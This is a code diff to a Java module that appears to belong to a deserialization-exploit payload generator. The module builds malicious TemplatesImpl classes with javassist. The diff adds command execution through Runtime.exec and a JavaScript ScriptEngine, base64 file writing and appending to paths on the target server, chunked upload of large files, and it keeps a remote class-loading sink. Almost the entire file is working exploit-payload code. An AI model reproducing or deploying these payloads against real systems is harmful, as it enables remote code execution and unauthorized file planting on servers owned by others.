@@ -7,10 +7,7 @@ import com.ppp.middleware.builder.JavaClassModifier;
 import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
-import com.ppp.utils.ClassFiles;
-import com.ppp.utils.Reflections;
-import com.ppp.utils.RemoteLoadD;
-import com.ppp.utils.Strings;
+import com.ppp.utils.*;
 import com.ppp.utils.maker.CryptoUtils;
 import com.ppp.utils.maker.JavaClassUtils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -19,10 +16,15 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
 import javassist.CtField;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
 
+import javax.script.ScriptEngineManager;
 import java.io.FileInputStream;
 import java.io.Serializable;
-import java.util.Arrays;
+import java.util.Base64;
 
 /**
  * @author Whoopsunix
@@ -40,16 +42,53 @@ public class TemplatesImpl {
     public Object runtime(SinksHelper sinksHelper) throws Exception {
         String className = "RuntimeD";
         String command = sinksHelper.getCommand();
+        EnchantEnums commandType = sinksHelper.getCommandType();
+        String code = sinksHelper.getCode();
+        String codeFile = sinksHelper.getCodeFile();
+        boolean split = sinksHelper.isSplit();
+
+        Printer.blueInfo("command type: " + commandType);
         Printer.yellowInfo("command: " + command);
 
         ClassPool pool = ClassPool.getDefault();
+        pool.importPackage("javax.script");
 
         CtClass ctClass = pool.makeClass(className);
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-        ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
 
-        // todo test
-//        ctConstructor.setBody(String.format("{Runtime.getRuntime().exec(new String[]{%s});}", splitCommand(command)));
+        switch (commandType) {
+            default:
+            case Runtime:
+                if (split) {
+                    ctConstructor.setBody(String.format("{Runtime.getRuntime().exec(new String[]{%s});}", CommandUtils.splitCommandComma(command)));
+                } else {
+                    ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+                }
+            case ScriptEngine:
+                if (codeFile != null) {
+                    try {
+
+                        FileInputStream fileInputStream = new FileInputStream(codeFile);
+                        byte[] codeBytes = new byte[fileInputStream.available()];
+                        fileInputStream.read(codeBytes);
+                        fileInputStream.close();
+                        code = new String(codeBytes);
+                    } catch (Exception e) {
+                        Printer.warn("File read error");
+                    }
+                } else if (code == null) {
+                    if (split) {
+                        code = String.format("x=new java.lang.ProcessBuilder;x.command(%s);x.start();", CommandUtils.splitCommandComma(command));
+                    } else {
+                        code = String.format("java.lang.Runtime.getRuntime().exec('%s');", command);
+                    }
+                }
+
+                Printer.yellowInfo("code: " + code);
+                String eval = String.format("{ScriptEngineManager manager = new ScriptEngineManager();ScriptEngine engine = manager.getEngineByName(\"js\");String code = \"%s\";engine.eval(code);}", code);
+                ctConstructor.setBody(eval);
+        }
+
 
         ctClass.addConstructor(ctConstructor);
 
@@ -60,28 +99,6 @@ public class TemplatesImpl {
         JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
         byte[] bytes = JavaClassModifier.toBytes(ctClass);
         return createTemplatesImpl(bytes);
-    }
-
-
-    public static String splitCommand(String command) {
-        // 使用 String.split() 方法将字符串按空格划分
-        String[] parts = command.split("\\s+");
-
-        // 截取前三段，如果段数超过三段
-        int segments = Math.min(parts.length, 3);
-
-        // 构造结果字符串
-        StringBuilder resultBuilder = new StringBuilder();
-        for (int i = 0; i < segments; i++) {
-            if (i < segments - 1) {
-                resultBuilder.append("\"").append(parts[i]).append("\"").append(",");
-            }
-        }
-        for (int i = 2; i < parts.length; i++) {
-            resultBuilder.append(parts[i]).append(" ");
-        }
-
-        return resultBuilder.toString();
     }
 
     /**
@@ -163,7 +180,7 @@ public class TemplatesImpl {
         String className = "RemoteLoadD";
 
         String url = sinksHelper.getUrl();
-        String remoteClassName = sinksHelper.getRemoteClassName();
+        String remoteClassName = sinksHelper.getClassName();
         Object constructor = sinksHelper.getConstructor();
         Printer.yellowInfo("Remote url: " + url);
         Printer.yellowInfo("Remote class name: " + remoteClassName);
@@ -223,36 +240,92 @@ public class TemplatesImpl {
         String serverFilePath = sinksHelper.getServerFilePath();
         String localFilePath = sinksHelper.getLocalFilePath();
         String fileContent = sinksHelper.getFileContent();
+        byte[] fileBytes = sinksHelper.getFileBytes();
+        boolean split = sinksHelper.isSplit();
+        boolean append = sinksHelper.isAppend();
+
+
         Printer.yellowInfo("Server file path: " + serverFilePath);
 
         byte[] contentBytes = new byte[]{};
 
-        if (localFilePath != null) {
-            Printer.yellowInfo("Local file path: " + localFilePath);
-            try {
-                FileInputStream fileInputStream = new FileInputStream(localFilePath);
-                contentBytes = new byte[fileInputStream.available()];
-                fileInputStream.read(contentBytes);
-                fileInputStream.close();
-            } catch (Exception e) {
-                Printer.error("File read error");
+        if (fileBytes != null) {
+            contentBytes = fileBytes;
+        } else {
+            if (localFilePath != null) {
+                Printer.yellowInfo("Local file path: " + localFilePath);
+                try {
+                    contentBytes = FileUtils.fileRead(localFilePath);
+                    Printer.warn(String.format("File content length: %s, if too large, please use -split option", contentBytes.length));
+                    if (split) {
+                        int partSize = sinksHelper.getPartSize();
+                        Printer.blueInfo("File will be split into " + partSize + "kb parts");
+                        sinksHelper.setFileParts(FileUtils.splitFile(localFilePath, partSize));
+                        sinksHelper.setLoop(true);
+                        return null;
+                    }
+                } catch (Exception e) {
+                    Printer.error("File read error");
+                }
+            } else if (fileContent != null) {
+                Printer.yellowInfo("File content: " + fileContent);
+                contentBytes = fileContent.getBytes();
             }
-        } else if (fileContent != null) {
-            Printer.yellowInfo("File content: " + fileContent);
-            contentBytes = fileContent.getBytes();
         }
+
+//        if (localFilePath != null) {
+//            Printer.yellowInfo("Local file path: " + localFilePath);
+//            try {
+//                FileInputStream fileInputStream = new FileInputStream(localFilePath);
+//                contentBytes = new byte[fileInputStream.available()];
+//                fileInputStream.read(contentBytes);
+//                fileInputStream.close();
+//            } catch (Exception e) {
+//                Printer.error("File read error");
+//            }
+//        } else if (fileContent != null) {
+//            Printer.yellowInfo("File content: " + fileContent);
+//            contentBytes = fileContent.getBytes();
+//        }
 
         String b64 = CryptoUtils.base64encoder(contentBytes);
 
         ClassPool pool = ClassPool.getDefault();
 
-        CtClass ctClass = pool.makeClass(className);
+//        CtClass ctClass;
+//        try {
+//            ctClass = pool.getCtClass(className);
+//        }catch (Exception e){
+//            ctClass = pool.makeClass(className);
+//        }
+        CtClass ctClass = pool.makeClass(RanDomUtils.generateRandomOnlyString(6));
+        ctClass.defrost();
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-        ctConstructor.setBody(String.format("{        java.lang.String b = \"%s\";\n" +
-                "        final byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
-                "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
-                "        fileOutputStream.write(bytes);\n" +
-                "        fileOutputStream.close();}", b64, serverFilePath));
+        if (append) {
+            Printer.blueInfo("bytes will be written to the end of the file");
+            ctConstructor.setBody(String.format("{String b = \"%s\";\n" +
+                    "        byte[] bytes = null;\n" +
+                    "        try{\n" +
+                    "            bytes = java.util.Base64.getDecoder().decode(b);\n" +
+                    "        }catch (Exception e){\n" +
+                    "            bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
+                    "        }\n" +
+                    "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\", true);\n" +
+                    "        fileOutputStream.write(bytes);\n" +
+                    "        fileOutputStream.close();}", b64, serverFilePath));
+        } else {
+            ctConstructor.setBody(String.format("{String b = \"%s\";\n" +
+                    "        byte[] bytes = null;\n" +
+                    "        try{\n" +
+                    "            bytes = java.util.Base64.getDecoder().decode(b);\n" +
+                    "        }catch (Exception e){\n" +
+                    "            bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
+                    "        }\n" +
+                    "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
+                    "        fileOutputStream.write(bytes);\n" +
+                    "        fileOutputStream.close();}", b64, serverFilePath));
+        }
+
         ctClass.addConstructor(ctConstructor);
 
         // CtClass 增强
